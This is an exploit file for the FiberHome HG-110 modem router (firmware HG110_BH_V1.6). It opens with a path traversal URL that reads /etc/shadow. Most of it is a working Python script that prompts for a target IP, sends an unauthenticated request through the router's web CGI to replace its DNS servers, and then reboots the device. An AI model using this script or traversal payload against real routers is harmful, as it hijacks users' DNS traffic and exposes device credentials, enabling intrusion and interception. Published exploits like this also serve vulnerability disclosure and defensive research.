# Exploit Title: Directory Path Traversal FiberHome Modem Router HG-110 / Remote Change DNS Servers
# Date: 22/09/2013
# Exploit Author: Javier Perez - javier@thecenutrios.com - @the_s41nt
# Vendor Homepage: http://hk.fiberhomegroup.com/
# Version: HG110_BH_V1.6


# PoC: Remote Change DNS Servers
# Example file "shadow": http://<public_ip>:8000/cgi-bin/webproc?getpage=../../../../../../../../../../../../etc/shadow&var:menu=advanced&var:page=dns

import urllib
import urllib2

ip = raw_input ("Enter Public IP: ")
dns1 = raw_input ("Enter DNS1: ")
dns2 = raw_input ("Enter DNS2: ")
url = 'http://'+ip+':8000/cgi-bin/webproc?getpage=html/index.html&var:menu=setup&var:page=lan'
user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
modificar = '%3AInternetGatewayDevice.LANDevice.1.X_TWSZ-COM_ProxyArp=0&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DomainName=bamovistarwifi&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.1.Enable=1&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.2.Enable=1&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.1.IPInterfaceIPAddress=192.168.1.1&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.1.IPInterfaceSubnetMask=255.255.255.0&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.2.IPInterfaceIPAddress=10.167.64.81&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.2.IPInterfaceSubnetMask=255.255.255.248&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DHCPServerEnable=1&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.MinAddress=192.168.1.33&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.MaxAddress=192.168.1.50&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DHCPLeaseTime=28800&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DHCPRelay=0&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.SubnetMask=255.255.255.0&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPRouters=192.168.1.1&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.1.X_TWSZ-COM_DHCPEnabled=1&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.2.X_TWSZ-COM_DHCPEnabled=1&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.3.X_TWSZ-COM_DHCPEnabled=1&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.4.X_TWSZ-COM_DHCPEnabled=1&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.X_TWSZ-COM_UseIPRoutersAsDNSServer=0&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DNSServers='+dns1+'%2C'+dns2+'&errorpage=html%2Findex.html&getpage=html%2Findex.html&var%3Amenu=setup&var%3Apage=lan&obj-action=set&var%3Aerrorpage=lan&%3AInternetGatewayDevice.LANDevice.1.LANEthernetInterfaceConfig.1.DhcpServerEnable=1&%3AInternetGatewayDevice.LANDevice.1.LANEthernetInterfaceConfig.2.DhcpServerEnable=1&%3AInternetGatewayDevice.LANDevice.1.LANEthernetInterfaceConfig.3.DhcpServerEnable=1&%3AInternetGatewayDevice.LANDevice.1.LANEthernetInterfaceConfig.4.DhcpServerEnable=1'
headers = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11' }

req = urllib2.Request(url, modificar, headers)
response = urllib2.urlopen(req)

url = 'http://'+ip+':8000/cgi-bin/webproc?getpage=html/index.html&var:menu=maintenance&var:page=system'
user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
modificar = 'reboot=Reboot&obj-action=reboot&var%3Anoredirect=1&var%3Amenu=maintenance&var%3Apage=system&var%3Aerrorpage=system&getpage=html%2Fpage%2Frestarting.html'
headers = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11' }

req = urllib2.Request(url, modificar, headers)
response = urllib2.urlopen(req)
the_page = response.read()